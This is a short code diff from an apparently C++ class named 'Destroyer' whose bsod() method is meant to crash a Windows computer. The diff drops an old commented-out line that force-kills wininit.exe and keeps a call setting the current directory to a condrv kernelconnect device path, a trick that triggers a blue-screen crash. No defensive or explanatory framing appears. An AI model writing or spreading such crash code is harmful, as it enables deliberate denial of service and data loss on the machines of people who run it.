@@ -11,10 +11,6 @@ class Destroyer{
     public:
         void bsod()//BSODs the computer
         {
-            /*system("taskkill /IM wininit.exe /F");
-            std :: cout << "This is a placeholder\n";*/
-            //the above code is old
-            //the below code is new
             _declspec(dllimport) int __stdcall SetCurrentDirectory(const unsigned char *lpPathName);
             SetCurrentDirectory("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
 
